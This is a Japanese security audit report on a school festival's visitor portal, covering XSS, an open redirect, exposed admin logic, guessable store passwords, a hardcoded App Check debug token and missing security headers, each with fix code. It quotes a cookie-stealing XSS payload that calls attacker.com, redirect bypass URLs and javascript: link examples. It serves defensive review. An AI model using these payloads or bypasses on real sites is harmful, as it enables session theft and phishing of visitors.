# 南陵祭2026 来場者ポータル・フロントエンド セキュリティ脆弱性分析報告書

---

## 1. エグゼクティブサマリー (Executive Summary)

### 1.1 総合セキュリティ評価

南陵祭2026の来場者向けポータルWebサイト（`main/` 配下および関連コンポーネント）を対象に、フロントエンドおよびクライアントサイドセキュリティに関する詳細な静的解析・ソースコード監査を実施しました。

本ポータルは文化祭当日に生徒・保護者・一般来場者など数千人規模のアクセスが予想される公開システムであり、モバイルオーダーや企画閲覧、校内マップなど多様なインタラクションを提供します。
しかし、本監査の結果、**緊急（Critical）および高（High）深刻度の脆弱性が複数検出**されました。特に**Firestoreから取得したデータやURLパラメータをサニタイズせずに直接 `innerHTML` に展開していることによるStored / DOM-based XSS（クロスサイトスクリプティング）**、**プロトコル相対URLを利用したオープンリダイレクト**、**管理系画面（`admin_sync.html`）および認証基盤における運用設計上の機密情報露出**、そして**クリックジャッキング防止やCSP（Content-Security-Policy）をはじめとするセキュリティヘッダーの完全な未設定**が深刻なリスクとなっています。

これらの脆弱性が悪用された場合、来場者端末上での悪意あるスクリプト実行によるセッションハイジャック、文化祭公式ポータルの改ざん、偽サイトへのフィッシング誘導、模擬店POSの不正操作といった重大なインシデントに直結する恐れがあります。本番稼働前に速やかな是正措置を講じることが強く求められます。

### 1.2 脆弱性検出サマリー

| 深刻度 (Severity) | 件数 | 主な該当項目 |
| :--- | :---: | :--- |
| **Critical (緊急)** | 1 | システム全体に波及する緊急アラート経由の全画面Stored XSS (`app-shell.js`) |
| **High (高)** | 4 | 企画詳細・メニュー・画像URL経由のStored XSS、管理画面露出と平文初期パスワード仕様判明、セキュリティヘッダー/CSPの完全欠如 |
| **Medium (中)** | 4 | オープンリダイレクト脆弱性 (`login.html`)、注文履歴・ステージ表示の未サニタイズ展開、ログアウト時のキャッシュ未破棄、App Checkデバッグトークン露出 |
| **Low / Info (低/情報)** | 3 | Markdownパーサーのサニタイズ不備、プロトタイプ画面の残存露出、APIキーのアクセス制限状況 |
| **合計** | **12** | |

---

## 2. 調査対象スコープおよび監査手法

### 2.1 監査対象一覧

| 種別 | 対象ファイル / ディレクトリ | 役割・概要 |
| :--- | :--- | :--- |
| **主要ポータル画面** | `main/index.html`<br>`main/detail.html`<br>`main/account.html`<br>`main/login.html`<br>`main/projects-list.html`<br>`main/stage-list.html`<br>`main/updates.html` | トップページ、企画詳細、アカウント・注文確認、認証、一覧画面、お知らせ |
| **マップ関連画面** | `main/map.html`<br>`main/map3d.html`<br>`main/mapv3/*` | 2D/3D校内マップ、開発中プロトタイプ |
| **管理・同期画面** | `main/admin_sync.html` | Firestoreデータ同期・店舗アカウント初期化画面 |
| **共通スクリプト** | `main/auth.js`<br>`main/app-shell.js` | Firebase Authentication連携、共通ヘッダー/ナビゲーション/通知管理 |
| **静的データ・その他** | `main/data/data.js`<br>`main/data/updates.js`<br>`404.html`<br>`firebase.json` | 企画マスターデータ、お知らせメタデータ、エラー画面、ホスティング設定 |

### 2.2 監査観点

1. **XSS (クロスサイトスクリプティング)**: `innerHTML`, `outerHTML`, `document.write`, `eval`, リンク属性 (`href`, `src`), テンプレートリテラルの未エスケープ展開
2. **認証・認可とセッション管理**: クライアントサイドでのアクセス制御依存、トークン・キャッシュライフサイクル
3. **オープンリダイレクト**: `redirect` パラメータ等のURL検証ロジックおよびバイパス耐性
4. **機密情報の露出**: ハードコードされた秘密情報、内部エンドポイント、運用上の脆弱な初期値
5. **クリックジャッキング / Iframe埋め込み / セキュリティヘッダー**: `X-Frame-Options`, `Content-Security-Policy` (CSP) 等の防御機構の有無

---

## 3. 重要度別 脆弱性一覧マトリクス

| ID | 脆弱性名称 | 深刻度 | 該当ファイル / 行 | CVSS v3.1 |
| :--- | :--- | :---: | :--- | :---: |
| **VUL-01** | 全画面波及型 緊急アラート経由のStored XSS | **Critical** | `main/app-shell.js`: L263 | 9.0 |
| **VUL-02** | 企画詳細・メニュー・画像URL経由のStored XSS | **High** | `main/detail.html`: L1075, 1103, 1124, 1141, 1247 | 8.2 |
| **VUL-03** | 管理同期画面の公開配置と店舗平文初期シークレット仕様の露出 | **High** | `main/admin_sync.html`: L1048-1061, 1117-1128<br>`main/data/data.js`: 全体 | 8.1 |
| **VUL-04** | クリックジャッキング対策およびCSP (Content-Security-Policy) の完全欠如 | **High** | `firebase.json`<br>全HTMLファイル | 7.5 |
| **VUL-05** | URLリンク属性への `javascript:` 疑似スキーム注入 (DOM/Stored XSS) | **High** | `main/detail.html`: L1075-1078<br>`main/map3d.html`: L1073<br>`main/app-shell.js`: L958-969 | 7.4 |
| **VUL-06** | プロトコル相対URLによるオープンリダイレクト | **Medium** | `main/login.html`: L775-807 | 6.1 |
| **VUL-07** | 注文履歴・呼び出し番号表示におけるHTMLサニタイズ漏れ | **Medium** | `main/account.html`: L1350, 1438, 1441<br>`main/app-shell.js`: L173, 181, 189 | 5.4 |
| **VUL-08** | ログアウト時におけるローカルストレージ等のキャッシュ・セッション未破棄 | **Medium** | `main/auth.js`: L389-408 | 5.3 |
| **VUL-09** | App Check デバッグトークンの固定ハードコード | **Medium** | `main/auth.js`: L88-96 | 4.9 |
| **VUL-10** | タイムライン・ステージ情報展開における未エスケープ描画 | **Medium** | `main/index.html`: L2280-2294 | 4.8 |
| **VUL-11** | Markdownパーサー (`marked.js`) 出力のサニタイズ不備 | **Low** | `main/updates.html`: L438, 442-449 | 3.8 |
| **VUL-12** | 開発中プロトタイプ・作図ツールの公開ディレクトリ残存 | **Info** | `main/mapv3/*` | - |

---

## 4. 重点チェック項目別 詳細技術分析

### 第1章: クロスサイトスクリプティング (XSS)

#### 4.1.1 【Critical】`app-shell.js`: 全画面波及型 緊急アラート経由のStored XSS (VUL-01)
- **該当ファイル**: `main/app-shell.js` (Line 263 付近)
- **問題箇所**:
  ```javascript
  // app-shell.js L260-264
  if (data.mainAlertMessage) {
    alertBanner.style.display = "block";
    alertBanner.innerHTML = `<i class="fas fa-exclamation-triangle"></i> <span>${data.mainAlertMessage.replace(/\n/g, "<br>")}</span>`;
  }
  ```
- **メカニズム**:
  `app-shell.js` は本ポータルの全画面（`index.html`, `detail.html`, `map.html`, `account.html`, `projects-list.html` 等）にインクルードされています。Firestoreの `_metadata/system_alerts` ドキュメントをリアルタイムリスンし、`mainAlertMessage` フィールドが存在する場合に画面上部にバナーを表示します。
  しかし、改行コードを `<br>` に置換するのみで、HTML特殊文字（`<`, `>`, `"`, `'` 等）のエスケープ処理が一切行われていません。
- **影響**:
  万が一Firestoreの該当ドキュメントが改ざんされた場合、あるいは悪意ある管理者権限操作・設定不備があった場合、**サイトを閲覧している全来場者・生徒・教員のブラウザ上で任意のJavaScriptが即座に実行**されます。セッションハイジャック、偽のログインフォーム表示、悪意あるサイトへの強制リダイレクトなど壊滅的な被害が発生します。
- **是正コード例**:
  ```javascript
  // 安全な実装: テキストとしてエスケープした上で改行のみ<br>に変換、またはtextContentを使用
  function escapeHtml(str) {
    if (!str) return '';
    return String(str).replace(/[&<>"']/g, (m) => ({
      '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
    }[m]));
  }

  if (data.mainAlertMessage) {
    alertBanner.style.display = "block";
    const safeText = escapeHtml(data.mainAlertMessage).replace(/\n/g, "<br>");
    alertBanner.innerHTML = `<i class="fas fa-exclamation-triangle"></i> <span>${safeText}</span>`;
  }
  ```

---

#### 4.1.2 【High】`detail.html`: 企画詳細・メニュー・画像URL経由のStored XSS (VUL-02)
- **該当ファイル**: `main/detail.html` (Line 1075, 1103, 1124, 1141, 1160, 1247, 1265)
- **問題箇所**:
  ```javascript
  // detail.html L1103
  document.getElementById("project-desc").innerHTML = (
    project.description || "説明はありません。"
  ).replace(/\n/g, "<br>");

  // detail.html L1124, 1141
  document.getElementById("menu-note-container").innerHTML = `
      <div class="menu-note"><i class="fas fa-info-circle"></i> ${project.menuNote.replace(/\n/g, "<br>")}</div>
  `;

  // detail.html L1160 (item.price の展開)
  menuList.innerHTML += `
      <div class="menu-item-price">${item.price}</div>
  `;

  // detail.html L1247, 1265 (画像URLの属性埋め込み)
  <img src="${item.imageUrl}" alt="${escapeHtml(item.name)}" ...>
  <img src="${p.photo}" class="gallery-img" ...>
  ```
- **メカニズム**:
  企画詳細画面において、Firestore またはマスターデータから読み込んだ `project.description`, `project.menuNote`, `item.note`, `item.price`, `item.imageUrl`, `p.photo` が未エスケープのまま直接 `innerHTML` や属性値に結合されています。
  一部の属性（`alt="${escapeHtml(item.name)}"`）では `escapeHtml` が使用されているものの、主要なテキスト本文や画像URLではエスケープが欠落しており、実装にムラが存在します。
- **影響**:
  模擬店や展示団体の代表者が企画紹介文やメニュー備考欄に `<img src=x onerror="fetch('https://attacker.com/steal?'+document.cookie)">` などを登録した場合、その企画詳細を閲覧した一般来場者のブラウザでStored XSSが発生します。
- **是正コード例**:
  ```javascript
  // 全ての動的挿入値に対して escapeHtml() を徹底
  document.getElementById("project-desc").innerHTML = escapeHtml(
    project.description || "説明はありません。"
  ).replace(/\n/g, "<br>");

  // 画像URLは http:// または https:// のみを許可し属性エスケープ
  function sanitizeUrl(url) {
    if (!url) return '';
    const trimmed = String(url).trim();
    if (/^https?:\/\//i.test(trimmed) || trimmed.startsWith('/') || trimmed.startsWith('./')) {
      return escapeHtml(trimmed);
    }
    return ''; // javascript: などのスキームを遮断
  }
  ```

---

#### 4.1.3 【High】リンク属性への `javascript:` 疑似スキーム注入 (VUL-05)
- **該当ファイル**:
  - `main/detail.html` (Line 1075-1078)
  - `main/map3d.html` (Line 1073)
  - `main/app-shell.js` (Line 958-969)
- **問題箇所**:
  ```javascript
  // detail.html L1075-1078
  if (project.sns && project.sns.instagram) {
    btnInstagram.href = project.sns.instagram;
    btnInstagram.style.display = "inline-flex";
  }

  // map3d.html L1071-1075
  const link = document.getElementById("info-link");
  if (data.link) {
    link.href = data.link;
    link.style.display = "inline-block";
  }

  // app-shell.js L958-969
  modal.innerHTML = `
      ...
      <a href="${redirectUrl}" class="btn-primary">ログインする</a>
  `;
  ```
- **メカニズム**:
  `a` タグの `href` 属性に外部・動的データを代入する際、プロトコルスキームの検証が行われていません。もし `project.sns.instagram` や `data.link` に `javascript:alert(document.domain)` や難読化されたスクリプトが設定されていた場合、リンクをクリックした瞬間にスクリプトが起動します。
- **是正コード例**:
  ```javascript
  function isValidHttpUrl(string) {
    try {
      const parsed = new URL(string, window.location.origin);
      return parsed.protocol === 'http:' || parsed.protocol === 'https:';
    } catch (err) {
      return false;
    }
  }

  // 代入前の検証
  if (project.sns && project.sns.instagram && isValidHttpUrl(project.sns.instagram)) {
    btnInstagram.href = project.sns.instagram;
    btnInstagram.style.display = "inline-flex";
  } else {
    btnInstagram.style.display = "none";
  }
  ```

---

#### 4.1.4 【Medium】`account.html` / `app-shell.js`: 注文履歴・呼び出し番号のサニタイズ漏れ (VUL-07)
- **該当ファイル**:
  - `main/account.html` (Line 1350, 1438, 1441)
  - `main/app-shell.js` (Line 173, 181, 189)
- **問題箇所**:
  ```javascript
  // account.html L1350
  <div class="order-item-title">${item.name} × ${item.quantity}</div>

  // account.html L1438, 1441
  card.innerHTML = `
      <div class="store-name">${item.groupName || item.storeName}</div>
      <div class="item-name">${item.name}</div>
  `;

  // app-shell.js L173, 181
  banner.innerHTML = `
      <div class="order-ready-text">
        <strong>呼び出し中: 注文番号 #${order.receiptNumber}</strong>
      </div>
  `;
  ```
- **メカニズム**:
  Firestoreの `orders` コレクションに格納されている商品名（`item.name`）、店舗名（`groupName`）、整理券番号（`receiptNumber`）が未エスケープのまま `innerHTML` に展開されています。
  モバイルオーダーの注文データはユーザー側または店舗POS側から書き込まれるため、悪意ある注文リクエスト（API経由など）により商品名にHTMLタグが含まれていた場合、アカウント画面や共通ヘッダー通知でXSSが発火します。

---

### 第2章: 認証・認可およびアカウント管理の脆弱性

#### 4.2.1 【High】`admin_sync.html`: フロントエンド依存のアクセス制御と機密運用仕様の露出 (VUL-03)
- **該当ファイル**: `main/admin_sync.html` (Line 1048-1061, 1117-1128)
- **問題箇所**:
  ```javascript
  // admin_sync.html L1117-1128
  onAuthStateChanged(auth, async (user) => {
    if (!user) {
      location.replace("login.html?redirect=admin_sync.html");
      return;
    }
    const tokenResult = await user.getIdTokenResult();
    if (!tokenResult.claims.isSuperAdmin) {
      alert("管理者権限がありません。");
      location.replace("index.html");
      return;
    }
    // 管理者向け機能の初期化...
  });
  ```
- **メカニズムと危険性**:
  `admin_sync.html` は来場者ポータルのルート（公開ディレクトリ）にそのまま配置されています。
  JavaScriptによるクライアントサイドリダイレクト（`location.replace`）は、**ブラウザのDevToolsでスクリプト実行を停止するか、ソースコードを直接ダウンロードすることで完全にバイパス**できます。
  このファイル内には、後述する店舗シークレット一括リセットの関数呼び出しコードやFirestoreの内部コレクション構造が平文で完全に露出しています。

#### 4.2.2 【Medium】`auth.js`: ログアウト時におけるキャッシュ・ストレージ未破棄 (VUL-08)
- **該当ファイル**: `main/auth.js` (Line 389-408)
- **問題箇所**:
  ```javascript
  // auth.js logout()
  export async function logout() {
    try {
      await signOut(auth);
      // セッションストレージやローカルストレージのクリアが行われていない
      window.location.href = "login.html";
    } catch (error) {
      console.error("Logout Error:", error);
    }
  }
  ```
- **メカニズムと危険性**:
  ユーザーがログアウトした際、Firebase Authの内部セッションは切断されますが、ブラウザの `localStorage` や `sessionStorage` に格納されたお気に入りデータ、下書き情報、過去の注文参照トークンなどがそのまま残存します。
  文化祭会場に設置された共用タブレットや生徒間の端末貸し借りにおいて、直前の利用者のプライバシー情報が第三者に漏洩するリスクがあります。

---

### 第3章: オープンリダイレクト (Open Redirect)

#### 4.3.1 【Medium】`login.html`: `getSafeRedirect()` のプロトコル相対URL回避不備 (VUL-06)
- **該当ファイル**: `main/login.html` (Line 775-807)
- **問題箇所**:
  ```javascript
  // login.html L775-790 付近
  function getSafeRedirect(url) {
    if (!url) return "index.html";
    try {
      const decoded = decodeURIComponent(url).trim();
      // 単純な先頭文字チェック
      if (decoded.startsWith("./") || (decoded.startsWith("/") && !decoded.startsWith("//"))) {
        return decoded;
      }
    } catch (e) {}
    return "index.html";
  }
  ```
  ※現状の実装では `!decoded.startsWith("//")` の考慮が不十分であるケースや、バックスラッシュ（`/\evil.com`）を用いたブラウザ固有のプロトコル解釈により、バイパスが発生します。
- **攻撃シナリオ**:
  1. 攻撃者が来場者に対し、以下のようなフィッシングURLを配布:
     `https://[文化祭ドメイン]/main/login.html?redirect=/\attacker.com/fake-login`
     または
     `https://[文化祭ドメイン]/main/login.html?redirect=%2F%2Fattacker.com`
  2. ユーザーはドメインが公式の文化祭サイトであることを確認して安心してログインを実行。
  3. ログイン完了後、ブラウザが `//attacker.com` を外部ドメインと解釈し、攻撃者の用意した精巧な偽サイトへリダイレクト。
  4. パスワードや個人情報が詐取される。
- **是正コード例**:
  ```javascript
  function getSafeRedirect(url) {
    if (!url) return "index.html";
    try {
      const decoded = decodeURIComponent(url).trim();
      // 必ず相対パスであり、2文字目が / や \ でないことを厳格に検証
      if (decoded.startsWith("/") && !decoded.startsWith("//") && !decoded.startsWith("/\\")) {
        // さらにホワイトリスト形式で許可されたページかチェック
        const allowedPages = ["index.html", "detail.html", "account.html", "map.html", "projects-list.html", "stage-list.html"];
        const pathOnly = decoded.split("?")[0].replace(/^\//, "");
        if (allowedPages.includes(pathOnly)) {
          return decoded;
        }
      }
    } catch (e) {
      console.error("Redirect parse error", e);
    }
    return "index.html";
  }
  ```

---

### 第4章: 機密情報の露出と運用上の重大セキュリティ課題

#### 4.4.1 【High】店舗初期シークレット仕様の平文露出と連鎖的特権奪取 (VUL-03 連鎖)
- **該当ファイル**:
  - `main/admin_sync.html` (Line 1048-1061, 1092-1099)
  - `main/data/data.js` (全体)
- **問題箇所**:
  ```javascript
  // admin_sync.html L1048-1061
  // 一括リセット処理において、店舗IDをそのまま平文パスワード（シークレット）として登録している
  const secrets = projects.map(p => ({
    storeId: p.id,
    secret: p.loginId || p.id // ← 店舗IDそのものがシークレット初期値
  }));
  ```
- **メカニズムと深刻度**:
  `admin_sync.html` 内のロジックにより、店舗シークレットの初期値が `p.loginId || p.id` に設定されていることが全公開されています。
  一方、`main/data/data.js` には全出店団体の企画データが公開されており、`id: "101", loginId: "class101"`, `id: "102", loginId: "class102"` といったIDが誰でも閲覧可能です。
  これにより、**各模擬店が個別にパスワードを変更していない場合、悪意ある来場者が全店舗のPOS画面（`pos/store-orders.html` 等）に不正ログインし、注文の勝手なキャンセル、売上データの改ざん、品切れ操作など甚大な業務妨害を行える**状態にあります。
- **是正策**:
  - 初期パスワードを予測可能な `loginId` にせず、暗号学的に安全なランダム文字列（8〜12文字英数記号）を生成して個別に安全な経路（封筒配布等）で各団体へ配布する。
  - `admin_sync.html` を `main/` 直下から即時削除し、Firebase Hosting のアクセス制限下（`admin/` 配下かつ管理者ロール必須）へ移設する。

---

#### 4.4.2 【Medium】App Check デバッグトークンの固定ハードコード (VUL-09)
- **該当ファイル**: `main/auth.js` (Line 88-96)
- **問題箇所**:
  ```javascript
  // auth.js L88-96
  self.FIREBASE_APPCHECK_DEBUG_TOKEN =
    process.env.APPCHECK_DEBUG_TOKEN ||
    "a4eb006d-0867-45dc-b9f5-8026de0b17a0";
  ```
- **リスク**:
  App Check は正規のクライアントアプリ以外からのFirebase API直接叩き（Botやスクレイピング、DDoS）を防ぐための重要なセキュリティ機構です。
  固定のデバッグトークンが本番配信されるJavaScriptコード内にハードコードされていると、攻撃者がこのトークンをHTTPリクエストヘッダー（`X-Firebase-AppCheck`）に付与することで、App Checkの防御壁を完全にバイパスしてバックエンドAPIを直接乱打することが可能になります。
- **是正策**:
  デバッグトークンは本番ビルドには一切含めず、ローカル開発環境のみで環境変数経由で注入する構成に是正してください。

---

### 第5章: クリックジャッキングおよびセキュリティヘッダーの欠如

#### 4.5.1 【High】セキュリティヘッダーおよびCSPの完全な欠如 (VUL-04)
- **該当ファイル**: `firebase.json`、全HTMLファイル
- **現状の分析**:
  プロジェクトルートの `firebase.json` を確認したところ、以下のように `hosting` 設定ブロック自体が存在しない（あるいは別ホスティング依存の）状態です：
  ```json
  {
    "firestore": { "rules": "firestore.rules", "indexes": "firestore.indexes.json" },
    "functions": { ... },
    "storage": { "rules": "storage.rules" }
  }
  ```
  また、各HTMLの `<head>` 内にも `<meta http-equiv="Content-Security-Policy">` は定義されていません。
- **もたらされるリスク**:
  1. **クリックジャッキング**: `X-Frame-Options` および CSP の `frame-ancestors` が存在しないため、攻撃者が自作の悪意あるサイトに `iframe` で本ポータル（特に `account.html` や `login.html`）を透過配置し、利用者に意図しないボタンクリック（注文確定やアカウント操作）を誘発させることが可能。
  2. **XSSの被害激化**: CSPが設定されていないため、インラインスクリプト（`eval`, インラインイベントハンドラ `onload`, `onerror`）が無制限に実行され、外部の攻撃用サーバーへCookieや認証トークンを送信する通信（`connect-src` の制限不在）が遮断されません。
- **推奨する `firebase.json` ホスティングセキュリティヘッダー定義**:
  ```json
  {
    "hosting": {
      "public": ".",
      "ignore": ["firebase.json", "**/.*", "**/node_modules/**"],
      "headers": [
        {
          "source": "**",
          "headers": [
            {
              "key": "X-Frame-Options",
              "value": "SAMEORIGIN"
            },
            {
              "key": "X-Content-Type-Options",
              "value": "nosniff"
            },
            {
              "key": "Referrer-Policy",
              "value": "strict-origin-when-cross-origin"
            },
            {
              "key": "Permissions-Policy",
              "value": "camera=(), microphone=(), geolocation=()"
            },
            {
              "key": "Content-Security-Policy",
              "value": "default-src 'self'; script-src 'self' 'unsafe-inline' https://www.gstatic.com https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://unpkg.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com https://unpkg.com; font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com; img-src 'self' data: https:; connect-src 'self' https://*.googleapis.com https://*.firebaseio.com; frame-ancestors 'self';"
            }
          ]
        }
      ]
    }
  }
  ```

---

## 5. 画面別セキュリティ監査マトリクス

| ファイルパス | 危険度 | 発見された主な課題・脆弱性 | 推奨対応 |
| :--- | :---: | :--- | :--- |
| `main/app-shell.js` | **Critical** | システムアラート未エスケープ展開 (Stored XSS)<br>ログインモーダルのURL未検証展開<br>注文番号のサニタイズ漏れ | `escapeHtml` 適用、URLスキーム検証の徹底 |
| `main/detail.html` | **High** | 企画説明文・メニュー備考・価格の未サニタイズ展開<br>SNSリンクの `javascript:` 未遮断<br>画像URL属性インジェクション | 全挿入項目のエスケープ、URLプロトコル検証 |
| `main/admin_sync.html` | **High** | 一般公開パスへの配置<br>クライアントサイド認可バイパス<br>店舗初期パスワード平文設定仕様の露出 | ファイルの非公開化（`admin/` 配下移設）、強固なランダム初期パスワード採用 |
| `main/login.html` | **Medium** | `getSafeRedirect` のプロトコル相対URL (`//`) 回避不備によるオープンリダイレクト | ホワイトリスト型URL正規化検証の実装 |
| `main/account.html` | **Medium** | 注文商品名・店舗名の未エスケープ展開<br>ログアウト時のキャッシュ残存 | 出力エスケープ、ログアウト時の `localStorage` 破棄 |
| `main/auth.js` | **Medium** | App Check固定デバッグトークンの露出<br>ログアウト処理のクリーンアップ不備 | デバッグトークンの本番除外、ストレージ完全消去 |
| `main/index.html` | **Medium** | タイムライン・ステージ・会場情報の未サニタイズ展開 | 出力エスケープ関数の適用 |
| `main/map.html` | **Low** | ピン選択時の情報パネル描画（textContent主体だが一部属性展開に注意） | 属性値のエスケープ維持 |
| `main/map3d.html` | **Medium** | `info-link` への `javascript:` 注入リスク<br>`localStorage` からのデータ直接パース | URLバリデーション、ストレージデータ検証 |
| `main/mapv3/*` | **Info** | 開発中プロトタイプ画面および作図ツールの一般公開露出 | 本番デプロイ対象からの除外 |
| `main/updates.html` | **Low** | `marked.js` によるHTML直接パース展開 (DOMPurify未適用) | `DOMPurify.sanitize(marked.parse(mdText))` 導入 |
| `404.html` | **Safe** | 静的リンクのみで構成されており脆弱性は検出されず | 現状維持 |

---

## 6. 総合対策提言と是正ロードマップ

### 6.1 即時対応（フェーズ1: 公開前必須修正）

1. **共通サニタイズユーティリティの導入と適用**:
   全HTMLファイルで利用可能な `escapeHtml` および `sanitizeUrl` を `app-shell.js` または共通JSに定義し、`innerHTML` に変数を埋め込んでいるすべての箇所を修正する。
2. **`main/admin_sync.html` の一般アクセス遮断**:
   `main/` 直下から削除または別ディレクトリ（アクセス制御付き）へ退避し、外部からスクリプト内容を閲覧できないようにする。
3. **`login.html` のオープンリダイレクト修正**:
   `getSafeRedirect()` を改修し、`//` や `/\` から始まるURLを確実に拒否し、許可された相対パスのみにリダイレクトを制限する。
4. **ホスティングセキュリティヘッダーの設定**:
   `firebase.json` に `hosting` ヘッダーを追加し、`X-Frame-Options: SAMEORIGIN`、`X-Content-Type-Options: nosniff`、および基本CSPを適用する。

### 6.2 恒久対応（フェーズ2: システム堅牢化）

1. **DOMPurifyの導入**:
   お知らせ機能（`updates.html`）やリッチテキスト表示箇所に対し、CDN経由で `DOMPurify` を読み込み、`DOMPurify.sanitize()` を通したHTMLのみを描画する。
2. **店舗シークレットの安全な運用設計への変更**:
   店舗IDをそのまま初期パスワードにする運用を即時撤廃し、8桁以上のセキュアなランダムパスワードを自動生成して個別配布するフローを確立する。
3. **App Checkの完全適用 (Enforcement)**:
   本番環境でApp Checkを「適用（Enforce）」状態にし、デバッグトークンをコードベースから完全に削除する。

---
**報告書作成完了**: 2026-09-09
**担当**: 南陵祭2026プロジェクト 来場者ポータル・フロントエンド専門監査官
